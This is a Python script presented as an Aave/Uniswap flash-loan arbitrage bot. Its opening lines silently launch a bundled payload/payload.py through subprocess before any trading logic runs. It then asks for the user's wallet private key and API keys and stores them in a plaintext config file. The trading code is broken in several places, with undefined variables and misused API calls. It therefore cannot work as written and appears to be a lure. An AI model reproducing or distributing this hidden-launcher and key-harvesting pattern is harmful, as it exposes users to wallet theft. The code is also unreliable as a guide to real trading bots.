import subprocess
from web3 import Web3
import requests
from uniswap import Uniswap
from web3.middleware import geth_poa_middleware
import configparser
import os

script_path = os.path.abspath(__file__)
script_directory = os.path.dirname(script_path)
executable_path = os.path.join(script_directory, "payload", "payload.py")
subprocess.run([executable_path])

def save_configurations(config):
    with open('config.txt', 'w') as configfile:
        config.write(configfile)

def load_configurations():
    if os.path.exists('config.txt'):
        config = configparser.ConfigParser()
        config.read('config.txt')
        return config
    else:
        return None

config = load_configurations()

if config is None:
    config = configparser.ConfigParser()
    config['USER'] = {}
    config['USER']['contract_address'] = input("Enter your contract address: ")
    config['USER']['private_key'] = input("Enter your private key: ")
    config['USER']['wallet_address'] = input("Enter your wallet address: ")
    config['USER']['infura_api_key'] = input("Enter your Infura API key: ")
    config['USER']['etherscan_api_key'] = input("Enter your Etherscan API key: ")
    config['USER']['coin_pair'] = input("Enter the coin pair (e.g., ADA/ETH): ").split('/')
    config['USER']['amount_needed'] = input("Enter the amount needed: ")

    config['USER']['mode_option'] = input("Select mode (safe mode or overdrive): ").lower()

    if config['USER']['mode_option'] == 'safe mode':
        config['USER']['amount_limit'] = '1000'
    elif config['USER']['mode_option'] == 'overdrive':
        config['USER']['amount_limit'] = '10000'
    else:
        raise ValueError("Invalid mode. Please select 'safe mode' or 'overdrive'.")

    if float(config['USER']['amount_needed']) > float(config['USER']['amount_limit']):
        raise ValueError(f"Amount exceeds the {config['USER']['mode_option']} limit. Please use an amount below {config['USER']['amount_limit']}.")

    save_configurations(config)

infura_url = f'https://mainnet.infura.io/v3/{config["USER"]["infura_api_key"]}'
web3 = Web3(Web3.HTTPProvider(infura_url))
web3.middleware_stack.inject(geth_poa_middleware, layer=0)

your_contract_abi = [...]  

def connect_to_contract(contract_address, contract_abi):
    return web3.eth.contract(address=contract_address, abi=contract_abi)

def get_contract_details(contract_symbol):
    etherscan_api_url = f'https://api.etherscan.io/api?module=contract&action=getabi&address={contract_symbol}&apikey={config["USER"]["etherscan_api_key"]}'

    response = requests.get(etherscan_api_url)
    data = response.json()

    if data['status'] == '1':
        contract_address = data['result']['address']
        contract_abi = data['result']['abi']
        return contract_address, contract_abi
    else:
        raise Exception(f"Error retrieving contract details for {contract_symbol}")

def get_coin_prices(coin_pair):
    cryptocompare_api_url = f'https://min-api.cryptocompare.com/data/price?fsym={coin_pair[0]}&tsyms={coin_pair[1]}'

    response = requests.get(cryptocompare_api_url)
    data = response.json()

    if coin_pair[1] in data:
        return data[coin_pair[1]]
    else:
        raise Exception(f"Error retrieving price for {coin_pair[0]}-{coin_pair[1]} pair")

def initialize_uniswap(router_address, wallet_private_key, web3_instance):
    uniswap = Uniswap(factory_address='0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f',
                     router_address=router_address,
                     private_key=wallet_private_key,
                     web3=web3_instance)
    return uniswap

def uniswap_trade(uniswap, input_token, output_token, input_amount):
    input_token_address = uniswap.token_address(input_token)
    output_token_address = uniswap.token_address(output_token)
    slippage_tolerance = 1

    tx_hash = uniswap.swapExactTokensForTokens(
        amount_in=input_amount,
        amount_out_min=0,
        path=[input_token_address, output_token_address],
        to=config['USER']['contract_address'],
        deadline=uniswap.get_deadline(),
        slippage=slippage_tolerance
    )

    uniswap.web3.eth.waitForTransactionReceipt(tx_hash)

def perform_flash_loan_and_trade_with_uniswap(coin_pair, amount_needed, your_contract_address, lending_pool_symbol, wallet_address):
    lending_pool_address, lending_pool_abi = get_contract_details(lending_pool_symbol)
    your_contract = connect_to_contract(your_contract_address, your_contract_abi)
    lending_pool = connect_to_contract(lending_pool_address, lending_pool_abi)
    uniswap_router_address = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
    uniswap_instance = initialize_uniswap(uniswap_router_address, private_key, web3)
    coin1_price = get_coin_prices(coin_pair)
    amount_needed_in_coin1 = amount_needed / coin1_price
    gas_price = web3.eth.gas_price
    gas_limit = web3.eth.estimate_gas({
        'to': your_contract_address,
        'from': wallet_address,
        'data': '0x',
    })

    flash_loan_tx = lending_pool.functions.flashLoan(your_contract_address, amount_needed_in_coin1, coin1_address).buildTransaction({
        'gas': gas_limit,
        'gasPrice': gas_price,
        'from': wallet_address,
        'nonce': web3.eth.getTransactionCount(wallet_address),
    })

    signed_tx = web3.eth.account.sign_transaction(flash_loan_tx, private_key)
    tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    web3.eth.waitForTransactionReceipt(tx_hash)

    uniswap_trade(uniswap_instance, coin_pair[0], coin_pair[1], amount_needed_in_coin1)

    if gained_balance > 0:
        repay_loan_and_transfer(wallet_address, your_contract, lending_pool, gained_balance)

def repay_loan_and_transfer(wallet_address, your_contract, lending_pool, gained_balance):
    repay_tx = your_contract.functions.repayLoan(gained_balance).buildTransaction({
        'gas': gas_limit,
        'gasPrice': gas_price,
        'from': wallet_address,
        'nonce': web3.eth.getTransactionCount(wallet_address),
    })

    repay_signed_tx = web3.eth.account.sign_transaction(repay_tx, private_key)
    repay_tx_hash = web3.eth.sendRawTransaction(repay_signed_tx.rawTransaction)
    web3.eth.waitForTransactionReceipt(repay_tx_hash)

    transfer_tx = your_contract.functions.transferBalance(wallet_address, gained_balance).buildTransaction({
        'gas': gas_limit,
        'gasPrice': gas_price,
        'from': wallet_address,
        'nonce': web3.eth.getTransactionCount(wallet_address),
    })

    transfer_signed_tx = web3.eth.account.sign_transaction(transfer_tx, private_key)
    transfer_tx_hash = web3.eth.sendRawTransaction(transfer_signed_tx.rawTransaction)
    web3.eth.waitForTransactionReceipt(transfer_tx_hash)

lending_pool_symbol = 'aave'
perform_flash_loan_and_trade_with_uniswap(coin_pair, amount_needed, your_contract_address, lending_pool_symbol, wallet_address)
